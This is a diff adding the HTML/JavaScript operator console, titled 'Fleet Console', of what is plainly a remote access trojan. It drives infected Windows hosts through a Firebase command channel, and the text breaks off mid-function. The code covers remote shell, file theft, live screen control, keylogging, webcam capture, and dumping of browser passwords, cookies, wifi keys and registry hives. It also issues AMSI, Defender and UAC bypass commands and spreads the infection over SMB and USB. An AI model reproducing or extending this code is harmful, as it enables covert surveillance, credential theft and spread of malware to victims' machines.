@@ -1,0 +1,477 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Fleet Console</title>
+<style>
+:root{--bg:#070a0e;--pn:#0d141c;--pn2:#121c26;--ln:#1a2733;--tx:#c6d6e5;--dim:#67809a;
+--ac:#38bdf8;--ok:#22c55e;--wr:#f59e0b;--er:#ef4444;--mono:ui-monospace,Menlo,Consolas,monospace}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--tx);font:13px/1.5 var(--mono);overflow:hidden}
+button{font:inherit;color:inherit;background:var(--pn2);border:1px solid var(--ln);
+padding:6px 12px;border-radius:7px;cursor:pointer;transition:.12s}
+button:hover{border-color:var(--ac);color:var(--ac)}
+button:active{transform:scale(.97)}
+button:disabled{opacity:.35}
+button.pri{background:linear-gradient(180deg,#0ea5e9,#0284c7);color:#021018;border-color:#38bdf8;font-weight:700}
+button.dgr{border-color:#5c2626;color:#fca5a5}
+input,textarea,select{font:inherit;background:#05090d;border:1px solid var(--ln);color:var(--tx);
+padding:7px 10px;border-radius:7px;width:100%;outline:none}
+input:focus,textarea:focus{border-color:var(--ac);box-shadow:0 0 0 3px #38bdf818}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:#233342;border-radius:6px}
+#app{display:grid;grid-template-columns:296px 1fr;grid-template-rows:52px 1fr 50px;height:100vh}
+#top{grid-column:1/-1;display:flex;align-items:center;gap:9px;padding:0 14px;
+background:linear-gradient(180deg,#0e1720,#080d13);border-bottom:1px solid var(--ln)}
+#brand{font-weight:800;letter-spacing:3px;color:var(--ac);display:flex;gap:7px;align-items:center}
+#brand i{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);animation:p 2s infinite}
+@keyframes p{50%{opacity:.3}}
+#search{max-width:230px}
+.chip{padding:4px 11px;border:1px solid var(--ln);border-radius:20px;font-size:11px;color:var(--dim);cursor:pointer}
+.chip.on{background:#0c2b3c;border-color:var(--ac);color:var(--ac)}
+#rolebadge{font-size:10px;padding:3px 9px;border-radius:20px;border:1px solid #3b2a5c;background:#1c1430;color:#c4a5f5;letter-spacing:1px}
+#conn{font-size:10px;padding:3px 9px;border-radius:20px;border:1px solid var(--ln);color:var(--dim)}
+#conn.dir{border-color:#166534;background:#0a2016;color:#6ee7a8;animation:p 1.6s infinite}
+#rail{background:#080e14;border-right:1px solid var(--ln);overflow-y:auto;padding:8px}
+.dev{display:flex;gap:9px;padding:9px;border:1px solid var(--ln);border-radius:9px;margin-bottom:6px;
+cursor:pointer;background:var(--pn);position:relative}
+.dev:hover{border-color:#2d4759;background:var(--pn2)}
+.dev.sel{border-color:var(--ac);background:#0e1e29}
+.av{width:32px;height:32px;border-radius:8px;background:#16232e;display:grid;place-items:center;
+font-weight:700;color:#7dd3fc;flex:0 0 32px;font-size:12px}
+.dev.on .av{background:#0d2a1c;color:#6ee7a8}
+.dev .nm{font-weight:700;color:#e6f0f9;font-size:12px;word-break:break-all}
+.dev .sub{font-size:10px;color:var(--dim);display:flex;gap:6px;flex-wrap:wrap}
+.dot{position:absolute;right:8px;top:8px;width:7px;height:7px;border-radius:50%;background:#4b2a2a}
+.dev.on .dot{background:var(--ok);box-shadow:0 0 7px var(--ok)}
+.bdg{font-size:8px;padding:1px 5px;border-radius:3px;border:1px solid #3b2a5c;background:#1c1430;color:#c4a5f5}
+#main{overflow:hidden;display:flex;flex-direction:column}
+#empty{flex:1;display:grid;place-items:center;color:#3f5769;gap:6px;text-align:center}
+#empty b{letter-spacing:4px;font-size:15px}
+#dv{display:none;flex:1;flex-direction:column;overflow:hidden}
+#dv.on{display:flex}
+#dh{padding:10px 15px;border-bottom:1px solid var(--ln);background:var(--pn);display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+#dh h2{font-size:14px}
+#dh .m{font-size:10px;color:var(--dim);display:flex;gap:10px;flex-wrap:wrap}
+#quick{display:flex;gap:5px;padding:7px 15px;background:#0a1017;border-bottom:1px solid var(--ln);overflow-x:auto}
+#quick button{padding:5px 11px;font-size:11px;border-radius:20px;white-space:nowrap}
+#tabs{display:flex;gap:1px;padding:0 10px;background:#080e14;border-bottom:1px solid var(--ln);overflow-x:auto}
+#tabs button{background:none;border:none;border-bottom:2px solid transparent;border-radius:0;padding:9px 12px;color:var(--dim);font-size:12px;white-space:nowrap}
+#tabs button.on{color:var(--ac);border-bottom-color:var(--ac)}
+#body{flex:1;overflow:auto;padding:13px 15px}
+.pane{display:none}.pane.on{display:block}
+pre{background:#04080c;border:1px solid var(--ln);border-radius:8px;padding:10px;max-height:430px;
+overflow:auto;white-space:pre-wrap;word-break:break-all;color:#a3c1d6;font-size:12px}
+.row{display:flex;gap:7px;align-items:center;margin-bottom:9px;flex-wrap:wrap}
+.row input{flex:1;min-width:110px}
+.card{background:var(--pn);border:1px solid var(--ln);border-radius:9px;padding:12px;margin-bottom:10px}
+.card h4{font-size:10px;letter-spacing:1.4px;color:var(--ac);margin-bottom:8px}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;font-size:9px;letter-spacing:1px;color:var(--ac);padding:5px;border-bottom:1px solid var(--ln)}
+td{padding:4px;border-bottom:1px solid #101a23;word-break:break-all}
+.tw{max-height:400px;overflow:auto;border:1px solid var(--ln);border-radius:8px}
+#img{max-width:100%;border-radius:8px;border:1px solid var(--ln);cursor:crosshair;background:#04080c}
+#frm{display:grid;place-items:center;background:#04080c;border:1px solid var(--ln);border-radius:8px;padding:6px;min-height:180px}
+#frm img{max-height:58vh}
+#foot{grid-column:1/-1;display:flex;gap:6px;align-items:center;padding:0 12px;
+background:#080e14;border-top:1px solid var(--ln);overflow-x:auto}
+#foot button{font-size:11px;padding:5px 11px;border-radius:20px;white-space:nowrap}
+#toasts{position:fixed;bottom:62px;right:14px;display:flex;flex-direction:column;gap:7px;z-index:400;max-width:330px}
+.tst{padding:10px 13px;border-radius:8px;background:#0f1c26;border:1px solid var(--ln);font-size:12px;
+animation:slide .2s;display:flex;gap:9px;align-items:center;box-shadow:0 8px 26px #000a}
+.tst.ok{border-color:#1f6b3f;background:#08170f;color:#8df0b2}
+.tst.er{border-color:#6d2424;background:#190c0c;color:#fca5a5}
+.tst .sp{width:11px;height:11px;border:2px solid #38bdf8;border-top-color:transparent;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+@keyframes slide{from{opacity:0;transform:translateX(26px)}}
+#modal{position:fixed;inset:0;background:#040709e8;display:none;place-items:center;z-index:500;padding:20px}
+#modal.on{display:grid}
+#modal img{max-width:94vw;max-height:88vh;border-radius:9px}
+#pal{position:fixed;inset:0;background:#040709d9;display:none;z-index:600;padding-top:12vh}
+#pal.on{display:block}
+#palbox{max-width:520px;margin:0 auto;background:#0c141c;border:1px solid var(--ln);border-radius:11px;overflow:hidden}
+#palbox input{border:none;border-bottom:1px solid var(--ln);border-radius:0;padding:13px}
+#palist{max-height:340px;overflow:auto}
+#palist div{padding:8px 13px;cursor:pointer;font-size:12px;border-bottom:1px solid #0e1720}
+#palist div:hover{background:#13212c;color:var(--ac)}
+#bar{position:fixed;left:0;right:0;bottom:50px;height:3px;background:#0b141c;display:none}
+#bar.on{display:block}
+#bar i{display:block;height:100%;width:35%;background:linear-gradient(90deg,#0ea5e9,#38bdf8);animation:load 1s infinite}
+@keyframes load{0%{margin-left:-35%}100%{margin-left:100%}}
+</style></head><body>
+<div id="app">
+<header id="top">
+ <div id="brand"><i></i>FLEET</div>
+ <span id="rolebadge">__ROLE__</span>
+ <span id="conn">firebase</span>
+ <input id="search" placeholder="search host / user / ip  ·  Ctrl+K">
+ <span class="chip on" data-f="all">all</span>
+ <span class="chip" data-f="on">online</span>
+ <span class="chip" data-f="adm">admin</span>
+ <div style="flex:1"></div>
+ <button onclick="palette()">commands</button>
+ <button onclick="render()">refresh</button>
+</header>
+
+<aside id="rail"><div style="font-size:10px;color:var(--dim);padding:2px 6px 8px;letter-spacing:1px">DEVICES <span id="cnt"></span></div><div id="list"></div></aside>
+
+<main id="main">
+ <div id="empty"><b>NO DEVICE</b><span>pick a machine from the rail</span></div>
+ <div id="dv">
+  <div id="dh"><h2 id="dn">—</h2><div class="m" id="dm"></div><div style="flex:1"></div>
+   <button class="pri" onclick="directConnect()" id="dcbtn">connect direct</button></div>
+  <div id="quick"></div>
+  <div id="tabs"></div>
+  <div id="body">
+   <div class="pane on" id="p-con"><div class="row"><input id="ic" placeholder="shell command · Enter" onkeydown="if(event.key==='Enter')exec()"><button class="pri" onclick="exec()">run</button></div><pre id="co">ready</pre></div>
+   <div class="pane" id="p-fil"><div class="row"><input id="fp" value="C:\" onkeydown="if(event.key==='Enter')ls()"><button onclick="ls()">go</button><button onclick="up()">up</button><button onclick="pick()">upload</button><input type="file" id="fi" hidden onchange="upfile(this.files[0])"></div><div class="tw"><table><thead><tr><th>name</th><th>size</th><th>modified</th><th></th></tr></thead><tbody id="fl"></tbody></table></div></div>
+   <div class="pane" id="p-liv"><div class="row"><button class="pri" id="lvb" onclick="liveT()">start</button><span id="li" style="color:var(--dim);font-size:11px">idle</span></div><div class="row"><input id="lt" placeholder="type text · Enter" onkeydown="if(event.key==='Enter'){txt();event.preventDefault()}"><select id="lk" style="max-width:120px" onchange="if(this.value){kbd(this.value);this.value=''}"><option value="">key</option><option value="13">Enter</option><option value="9">Tab</option><option value="27">Esc</option><option value="8">Bksp</option><option value="46">Del</option><option value="91">Win</option><option value="17">Ctrl</option><option value="18">Alt</option></select><select id="lb" style="max-width:100px"><option value="left">left</option><option value="right">right</option></select></div><div id="frm"><img id="img"></div></div>
+   <div class="pane" id="p-key"><div class="row"><button class="pri" onclick="send('keylog',{on:true})">start</button><button onclick="send('keylog',{on:false})">stop</button><button onclick="clr()">clear</button><input id="kf" placeholder="filter" oninput="drawK()"></div><div id="kl" style="font-size:12px;line-height:1.7"></div></div>
+   <div class="pane" id="p-cap"><div class="row"><button onclick="send('shot')">screenshot</button><button onclick="send('cam')">webcam</button></div><div class="g3" id="gal"></div></div>
+   <div class="pane" id="p-prc"><div class="row"><button onclick="send('proc')">refresh</button><input id="pf" placeholder="filter" oninput="drawP()"></div><div class="tw"><table><thead><tr><th>pid</th><th>name</th><th>mem</th><th></th></tr></thead><tbody id="pl"></tbody></table></div></div>
+   <div class="pane" id="p-svc"><div class="card"><h4>SERVICE</h4><div class="row"><input id="sn" placeholder="service name"><button onclick="sv('query')">query</button><button onclick="sv('start')">start</button><button onclick="sv('stop')">stop</button><button class="dgr" onclick="sv('disable')">disable</button></div></div><pre id="so">—</pre></div>
+   <div class="pane" id="p-reg"><div class="card"><h4>REGISTRY</h4><div class="row"><input id="rp" placeholder="HKLM\SOFTWARE\..."><button onclick="send('reg',{op:'read',path:rp.value})">read</button></div><div class="row"><input id="rn" placeholder="name"><input id="rv" placeholder="value"><button onclick="send('reg',{op:'write',path:rp.value,name:rn.value,val:rv.value})">write</button></div></div><pre id="ro">—</pre></div>
+   <div class="pane" id="p-clp"><div class="row"><button onclick="send('clip')">read</button><button onclick="cs()">write</button></div><pre id="clo">—</pre></div>
+   <div class="pane" id="p-net"><div class="card"><h4>NETWORK</h4><div class="row"><input id="sub" value="192.168.1"><button onclick="send('scan',{sub:sub.value})">scan /24</button><button onclick="send('lan')">arp table</button><button onclick="send('smb')">shares</button></div><div class="row"><input id="dh2" placeholder="host"><button onclick="send('rexec',{host:dh2.value,cmd:'whoami'})">remote whoami</button><button onclick="send('spread')">spread smb</button><button onclick="send('usb')">spread usb</button></div></div><pre id="no">—</pre></div>
+   <div class="pane" id="p-rdp"><div class="card"><h4>REMOTE DESKTOP</h4><div class="row"><button onclick="send('rdp')">enable rdp</button><button onclick="copyRdp()">copy mstsc line</button></div><pre id="rdpo">enable RDP, then run the copied line from your PC.</pre></div></div>
+   <div class="pane" id="p-cre"><div class="row"><button onclick="send('pass')">browser logins</button><button onclick="send('cookies')">cookies</button><button onclick="send('wifi')">wifi keys</button><button onclick="send('cmdkey')">saved creds</button><button onclick="send('hives')">dump hives</button></div><pre id="cro">—</pre></div>
+   <div class="pane" id="p-ops"><div class="g2">
+    <div class="card"><h4>MESSAGE</h4><input id="mt" placeholder="title" style="margin-bottom:6px"><textarea id="mx" rows="2" placeholder="text"></textarea><div class="row" style="margin-top:6px"><button onclick="send('msg',{title:mt.value,text:mx.value})">show</button></div></div>
+    <div class="card"><h4>POWER</h4><div class="row"><button onclick="send('lock')">lock</button><button onclick="send('monoff')">monitor off</button><button onclick="send('power',{mode:'r'})">reboot</button><button class="dgr" onclick="send('power',{mode:'s'})">shutdown</button></div></div>
+    <div class="card"><h4>EVASION</h4><div class="row"><button onclick="send('amsi')">patch amsi</button><button onclick="send('defoff')">defender off</button><button onclick="send('fwoff')">firewall off</button><button onclick="send('uac')">uac bypass</button></div></div>
+    <div class="card"><h4>AGENT</h4><div class="row"><button onclick="send('persist')">reinstall</button><button onclick="send('heal')">heal</button><button onclick="send('httpd',{port:7443})">open 7443</button><button class="dgr" onclick="send('uninst')">uninstall</button></div></div>
+   </div></div>
+   <div class="pane" id="p-res"><div class="row"><button onclick="RES=[];drawR()">clear</button><select id="rf" style="max-width:120px" onchange="drawR()"><option value="all">all</option><option value="ok">ok</option><option value="bad">fail</option></select></div><div id="rl"></div></div>
+  </div>
+ </div>
+</main>
+<footer id="foot"></footer>
+</div>
+<div id="bar"><i></i></div>
+<div id="toasts"></div>
+<div id="modal" onclick="if(event.target.id==='modal')closeM()"><img id="mi"></div>
+<div id="pal" onclick="if(event.target.id==='pal')closeP()"><div id="palbox"><input id="pq" placeholder="type a command…" oninput="fillP()"><div id="palist"></div></div></div>
+
+<script>
+const FB="__FB__", ROLE="__ROLE__";
+const DIRPORT=7443;
+let cur=null, DEV={}, live=false, lvT=null, RES=[], FIL="all", Q="", KL={}, PR=[], BASE=null, lastSel=null;
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
+const esc=s=>String(s??"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const slp=ms=>new Promise(r=>setTimeout(r,ms));
+
+async function call(m,p,b){
+  if(BASE){
+    const t0=performance.now();
+    const r=await fetch(BASE+"/cmd",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({c:p,...b})});
+    const j=await r.json(); $("#conn").textContent="direct "+(performance.now()-t0).toFixed(0)+"ms"; return j;
+  }
+  const r=await fetch(FB+"/"+p+".json",{method:m,body:b?JSON.stringify(b):null});
+  try{return await r.json()}catch(e){return null}
+}
+const getF=p=>fetch(FB+"/"+p+".json").then(r=>r.json()).catch(()=>null);
+
+function toast(msg,cls,spin){
+  const d=document.createElement("div"); d.className="tst "+(cls||"");
+  d.innerHTML=(spin?'<span class="sp"></span>':"")+"<span>"+esc(msg)+"</span>";
+  $("#toasts").appendChild(d); return d;
+}
+function done(el,msg,ok){
+  el.className="tst "+(ok?"ok":"er"); el.innerHTML="<span>"+(ok?"✓ ":"✕ ")+esc(msg)+"</span>";
+  setTimeout(()=>{el.style.opacity=0;setTimeout(()=>el.remove(),250)},2600);
+}
+
+let SEQ=0;
+async function send(c,a={},label){
+  if(!cur) return null;
+  const lb=label||c;
+  const t=toast(lb+" …","",true);
+  if(BASE){
+    try{
+      const r=await call("POST",c,a);
+      done(t, lb+(r.ok?" ok":" failed"), r.ok);
+      push(c,lb,r); route(c,r); return r;
+    }catch(e){ done(t,lb+" link lost",false); BASE=null; $("#conn").textContent="firebase"; $("#conn").className=""; throw e }
+  }
+  const tid=Date.now().toString(36)+"-"+(SEQ++).toString(36);
+  await fetch(FB+"/tasks/"+cur+"/"+tid+".json",{method:"PUT",body:JSON.stringify({c,st:"queued",ts:Math.floor(Date.now()/1000),...a})});
+  const poll=async n=>{
+    const r=await getF("results/"+cur+"/"+tid);
+    if(r){ done(t, lb+(r.ok?" ok":" failed"), r.ok); push(c,lb,r); route(c,r); return }
+    if(n>90){ done(t,lb+" timeout",false); return }
+    setTimeout(()=>poll(n+1),800);
+  };
+  poll(0);
+}
+function push(c,l,r){ RES.unshift({c,l,ok:!!r.ok,o:r.out,ts:Date.now()}); if(RES.length>200)RES.pop(); drawR() }
+const S=o=>typeof o==="string"?o:JSON.stringify(o,null,1);
+const isB=o=>typeof o==="string"&&o.length>700&&/^[A-Za-z0-9+/=\s]+$/.test(o.slice(0,100));
+
+function route(c,r){
+  const o=r.out, tab=tabOn();
+  if(tab==="con") $("#co").textContent=S(o);
+  if(Array.isArray(o)&&tab==="fil") drawF(o);
+  if(c==="proc"&&typeof o==="string") { PR=parseP(o); drawP() }
+  if(tab==="svc") $("#so").textContent=S(o);
+  if(tab==="reg") $("#ro").textContent=S(o);
+  if(tab==="clp") $("#clo").textContent=S(o);
+  if(tab==="net") $("#no").textContent=S(o);
+  if(tab==="cre") $("#cro").textContent=S(o);
+  if(tab==="rdp") $("#rdpo").textContent=S(o);
+  if(c==="info"&&typeof o==="object") meta(o);
+  if((c==="shot"||c==="cam")&&isB(o)) gal(o);
+  if(c==="hives"&&Array.isArray(o)) $("#cro").textContent=S(o);
+}
+
+function render(){
+  const now=Date.now()/1000;
+  const ids=Object.keys(DEV).filter(id=>{
+    const v=DEV[id]; if(!v) return false;
+    const on=now-(v.last||0)<50;
+    if(FIL==="on"&&!on) return false;
+    if(FIL==="adm"&&!v.admin) return false;
+    if(Q){const s=((v.host||"")+(v.user||"")+(v.ip||"")).toLowerCase(); if(!s.includes(Q)) return false}
+    return true;
+  }).sort((a,b)=>(DEV[b].last||0)-(DEV[a].last||0));
+  let on=0; Object.values(DEV).forEach(v=>{if(v&&now-(v.last||0)<50)on++});
+  $("#cnt").textContent=on+"/"+Object.keys(DEV).length;
+  $("#list").innerHTML = ids.length? "" : '<div style="padding:12px;color:#4b6478;font-size:11px;text-align:center">none</div>';
+  ids.forEach(id=>{
+    const v=DEV[id], on2=now-(v.last||0)<50;
+    const d=document.createElement("div");
+    d.className="dev"+(on2?" on":"")+(id===cur?" sel":"");
+    d.innerHTML=`<div class="av">${esc((v.host||"?").slice(0,2).toUpperCase())}</div>
+      <div><div class="nm">${esc(v.host||id)} ${v.admin?'<span class="bdg">ADMIN</span>':""}</div>
+      <div class="sub"><span>${esc(v.user||"?")}</span><span>${esc(v.ip||"")}</span><span>${on2?"now":ago(v.last)}</span></div></div>
+      <span class="dot"></span>`;
+    d.onclick=()=>openD(id);
+    $("#list").appendChild(d);
+  });
+}
+const ago=t=>{if(!t)return"never";const s=Date.now()/1000-t;return s<60?Math.floor(s)+"s":s<3600?Math.floor(s/60)+"m":Math.floor(s/3600)+"h"};
+
+function openD(id){
+  cur=id; lastSel=id; localStorage.setItem("last",id);
+  $("#empty").style.display="none"; $("#dv").classList.add("on");
+  tabs(); quick(); hdr(); render(); $("#co").textContent="ready";
+  if(!DEV[id]?.info) send("info");
+}
+function hdr(){
+  const v=DEV[cur]||{}, i=v.info||{};
+  $("#dn").textContent=v.host||cur;
+  $("#dm").innerHTML=[v.admin?'<span class="bdg">ADMIN</span>':"",`<span>${esc(v.user||"?")}</span>`,
+    `<span>${esc(v.ip||"")}</span>`, i.os?`<span>${esc(String(i.os).split("\n")[0])}</span>`:"",
+    `<span>last ${ago(v.last)}</span>`].filter(Boolean).join("");
+}
+function meta(i){ if(!cur)return; DEV[cur].info=i; hdr() }
+
+const QUICK=[["ping",()=>send("ping")],["info",()=>send("info")],["shot",()=>send("shot")],
+ ["live",()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()}],["files",()=>{$$("#tabs button").find(b=>b.dataset.k==="fil").click()}],
+ ["rdp",()=>{$$("#tabs button").find(b=>b.dataset.k==="rdp").click()}],["lock",()=>send("lock")],
+ ["reboot",()=>send("power",{mode:"r"})],["spread",()=>send("spread")],["hives",()=>send("hives")]];
+function quick(){
+  $("#quick").innerHTML="";
+  QUICK.forEach(([n,f])=>{const b=document.createElement("button");b.textContent=n;b.onclick=f;$("#quick").appendChild(b)});
+}
+
+const TABS=[["con","console"],["fil","files"],["liv","live"],["key","keylog"],["cap","capture"],
+ ["prc","processes"],["svc","services"],["reg","registry"],["clp","clipboard"],["net","network"],
+ ["rdp","rdp"],["cre","creds"],["ops","ops"],["res","results"]];
+function tabs(){
+  const t=$("#tabs"); t.innerHTML="";
+  TABS.forEach(([k,n],i)=>{
+    const b=document.createElement("button"); b.textContent=n; b.dataset.k=k;
+    if(i===0)b.classList.add("on");
+    b.onclick=()=>{$$(".pane").forEach(p=>p.classList.remove("on"));$$("#tabs button").forEach(x=>x.classList.remove("on"));
+      $("#p-"+k).classList.add("on"); b.classList.add("on");
+      if(k==="key") loadK(); if(k==="prc"&&!PR.length) send("proc"); if(k==="res") drawR();
+      if(k!=="liv"&&live) stopL()};
+    t.appendChild(b);
+  });
+  foot();
+}
+const tabOn=()=>$("#tabs button.on")?.dataset.k;
+function foot(){
+  const f=$("#foot"); f.innerHTML="";
+  if(ROLE!=="admin"){
+    ["shot","info","ping"].forEach(n=>{const b=document.createElement("button");b.textContent=n;
+      b.onclick=()=>send(n);f.appendChild(b)});
+    f.innerHTML+='<span style="font-size:10px;color:var(--dim)">read-only</span>'; return;
+  }
+  [["shell",()=>exec()],["shot",()=>send("shot")],["live",()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()}],
+   ["files",()=>{$$("#tabs button").find(b=>b.dataset.k==="fil").click()}],["keylog",()=>send("keylog",{on:true})],
+   ["lock",()=>send("lock")],["reboot",()=>send("power",{mode:"r"})],["uninstall",()=>send("uninst")]]
+   .forEach(([n,f2])=>{const b=document.createElement("button");b.textContent=n;b.onclick=f2;f.appendChild(b)});
+}
+
+function exec(){const c=$("#ic").value; if(!c)return; send("exec",{cmd:c},c); $("#ic").value=""}
+async function ls(){ const p=$("#fp").value||"C:\\"; const r=await send("ls",{path:p},null); if(r) drawF(r.out) }
+function drawF(a){
+  const t=$("#fl"); t.innerHTML="";
+  if(!Array.isArray(a)){t.innerHTML=`<tr><td colspan="4">${esc(S(a))}</td></tr>`;return}
+  a.forEach(f=>{
+    const tr=document.createElement("tr");
+    tr.innerHTML=`<td>${f.d?"📁":"📄"} ${esc(f.n)}</td><td>${f.d?"":kb(f.s)}</td><td>${f.m?new Date(f.m*1000).toLocaleString():""}</td><td></td>`;
+    const td=tr.lastElementChild;
+    if(f.d){td.appendChild(mk("open",()=>{$("#fp").value=jn($("#fp").value,f.n);ls()}))}
+    else td.appendChild(mk("get",()=>dl(f.n)));
+    t.appendChild(tr);
+  });
+}
+const kb=n=>n>1048576?(n/1048576).toFixed(1)+" MB":n>1024?(n/1024).toFixed(1)+" KB":n+" B";
+const jn=(a,b)=>a.replace(/\\$/,"")+"\\"+b;
+const mk=(t,f)=>{const b=document.createElement("button");b.textContent=t;b.style.padding="2px 8px";b.style.fontSize="11px";b.onclick=f;return b};
+function up(){ $("#fp").value=$("#fp").value.replace(/\\[^\\]*$/,"")||"C:\\"; ls() }
+function pick(){ $("#fi").click() }
+
+async function dl(name){
+  const path=jn($("#fp").value,name), uid="d"+Date.now().toString(36);
+  const r=await send("dl",{path,uid},"get "+name);
+  if(!r?.ok) return;
+  let m=null;
+  for(let i=0;i<80;i++){ await slp(700); m=await getF("xfer/"+uid+"/meta"); if(m?.chunks>0){await slp(800);m=await getF("xfer/"+uid+"/meta");break} }
+  if(!m?.chunks) return toast("transfer failed","er");
+  const parts=[];
+  for(let i=0;i<m.chunks;i++){ const c=await getF(`xfer/${uid}/c/${i}`); if(c)parts.push(b64(c)) }
+  const a=document.createElement("a"); a.href=URL.createObjectURL(new Blob(parts)); a.download=m.name||name; a.click();
+  done(toast("saving "+name),name+" saved",true);
+}
+const b64=s=>{const t=atob(s.replace(/\s/g,"")),u=new Uint8Array(t.length);for(let i=0;i<t.length;i++)u[i]=t.charCodeAt(i);return u};
+
+async function upfile(f){
+  if(!f) return;
+  const dest=jn($("#fp").value,f.name), uid="u"+Date.now().toString(36), CH=180000, n=Math.ceil(f.size/CH);
+  const t=toast("uploading "+f.name+" 0%","",true);
+  for(let i=0;i<n;i++){
+    const b=new Uint8Array(await f.slice(i*CH,(i+1)*CH).arrayBuffer());
+    let s=""; for(const x of b) s+=String.fromCharCode(x);
+    await fetch(FB+`/xfer/${uid}/c/${i}.json`,{method:"PUT",body:JSON.stringify(btoa(s))});
+    t.lastChild.textContent="uploading "+f.name+" "+Math.round((i+1)/n*100)+"%";
+  }
+  await fetch(FB+`/xfer/${uid}/meta.json`,{method:"PUT",body:JSON.stringify({name:f.name,size:f.size,chunks:n})});
+  await send("ul",{uid,path:dest},"put "+f.name);
+  done(t,f.name+" sent",true); setTimeout(ls,1200);
+}
+
+function liveT(){ live?stopL():startL() }
+async function startL(){
+  if(!cur) return;
+  await send("live",{on:true});
+  live=true; $("#lvb").textContent="stop";
+  lvT=setInterval(async()=>{
+    const f=await getF("live/"+cur+"/frame");
+    if(f?.d){ $("#img").src="data:image/jpeg;base64,"+f.d; $("#li").textContent=new Date(f.ts).toLocaleTimeString() }
+  },420);
+}
+async function stopL(){ if(!live)return; live=false; clearInterval(lvT); $("#lvb").textContent="start"; if(cur) await send("live",{on:false}) }
+
+function pt(e){
+  const r=$("#img").getBoundingClientRect();
+  const i=DEV[cur]?.info?.disks?1920:1920;
+  return {x:Math.round((e.clientX-r.left)/r.width*1920), y:Math.round((e.clientY-r.top)/r.height*1080), b:$("#lb").value};
+}
+$("#img").addEventListener("click",async e=>{
+  if(!live)return; const p=pt(e);
+  await fetch(FB+`/live/${cur}/input/${Date.now()}a.json`,{method:"PUT",body:JSON.stringify({t:"mouse",x:p.x,y:p.y,b:p.b,d:true,ts:Date.now()})});
+  setTimeout(()=>fetch(FB+`/live/${cur}/input/${Date.now()}b.json`,{method:"PUT",body:JSON.stringify({t:"mouse",x:p.x,y:p.y,b:p.b,d:false,ts:Date.now()+1})}),80);
+});
+async function txt(){ const s=$("#lt").value; if(!s||!live)return;
+  await fetch(FB+`/live/${cur}/input/${Date.now()}.json`,{method:"PUT",body:JSON.stringify({t:"text",s,ts:Date.now()})}); $("#lt").value="" }
+async function kbd(v){ if(!live)return; await fetch(FB+`/live/${cur}/input/${Date.now()}.json`,{method:"PUT",body:JSON.stringify({t:"key",vk:+v,ts:Date.now()})}) }
+
+async function loadK(){ KL=await getF("keylog/"+cur)||{}; drawK() }
+function drawK(){
+  const f=$("#kf").value.toLowerCase();
+  $("#kl").innerHTML=Object.entries(KL).sort((a,b)=>+a[0]-+b[0])
+    .filter(([,v])=>!f||(v.t||"").toLowerCase().includes(f))
+    .map(([ts,v])=>`<div><span style="color:#4f6b82;font-size:10px">${new Date(+ts).toLocaleTimeString()}</span> ${esc(v.t||"")}</div>`).join("")||'<div style="color:#4b6478">empty</div>';
+}
+async function clr(){ await fetch(FB+"/keylog/"+cur+".json",{method:"DELETE"}); KL={}; drawK() }
+
+function gal(s){
+  const d=document.createElement("div"); d.className="card";
+  d.innerHTML=`<img src="data:image/jpeg;base64,${s}" style="width:100%;border-radius:6px;cursor:zoom-in">`;
+  d.firstChild.onclick=()=>{$("#mi").src=d.firstChild.src;$("#modal").classList.add("on")};
+  $("#gal").prepend(d); if($("#gal").children.length>10)$("#gal").lastChild.remove();
+}
+function closeM(){ $("#modal").classList.remove("on") }
+
+function parseP(t){ return t.split("\n").slice(1).map(l=>{const m=l.match(/^"([^"]+)","(\d+)","[^"]*","[^"]*","(\d+)/);return m?{n:m[1],p:m[2],m:m[3]}:null}).filter(Boolean) }
+function drawP(){
+  const f=$("#pf").value.toLowerCase(), rows=PR.filter(p=>!f||p.n.toLowerCase().includes(f));
+  $("#pl").innerHTML=rows.map(p=>`<tr><td>${p.p}</td><td>${esc(p.n)}</td><td>${kb(+p.m*1024)}</td><td></td></tr>`).join("");
+  $$("#pl tr").forEach((tr,i)=>tr.lastElementChild.appendChild(mk("kill",()=>send("kill",{pid:rows[i].p}))));
+}
+
+function sv(o){ const n=$("#sn").value; if(n) send("svc",{op:o,name:n}) }
+function cs(){ const t=prompt("clipboard text"); if(t!==null) send("clip",{op:"set",text:t}) }
+function copyRdp(){ const ip=DEV[cur]?.ip||""; navigator.clipboard.writeText("mstsc /v:"+ip); done(toast("copied"),"mstsc /v:"+ip,true) }
+
+function drawR(){
+  const f=$("#rf").value;
+  $("#rl").innerHTML=RES.filter(r=>f==="all"||(f==="ok"?r.ok:!r.ok))
+    .map(r=>`<div class="card" style="border-left:3px solid ${r.ok?"var(--ok)":"var(--er)"}"><div style="font-size:10px;color:var(--dim)">${new Date(r.ts).toLocaleTimeString()} · ${esc(r.l)}</div><pre style="max-height:110px;margin-top:5px">${esc(S(r.o)).slice(0,700)}</pre></div>`)
+    .join("")||'<div style="color:#4b6478">no results</div>';
+}
+
+/* ---------- direct ---------- */
+async function directConnect(){
+  if(!cur) return;
+  if(BASE){ BASE=null; $("#conn").textContent="firebase"; $("#conn").className=""; $("#dcbtn").textContent="connect direct"; return done(toast(""),"back to firebase",true) }
+  const t=toast("opening direct channel on "+DIRPORT+" …","",true);
+  await send("httpd",{port:DIRPORT});
+  let net=null;
+  for(let i=0;i<20;i++){ await slp(700); net=await getF("net/"+cur); if(net?.port) break }
+  if(!net?.ip) return done(t,"agent did not report an ip",false);
+  BASE="http://"+net.ip+":"+net.port;
+  try{
+    const r=await fetch(BASE+"/",{cache:"no-store"}); if(!r.ok) throw 0;
+    $("#conn").textContent="direct"; $("#conn").className="dir";
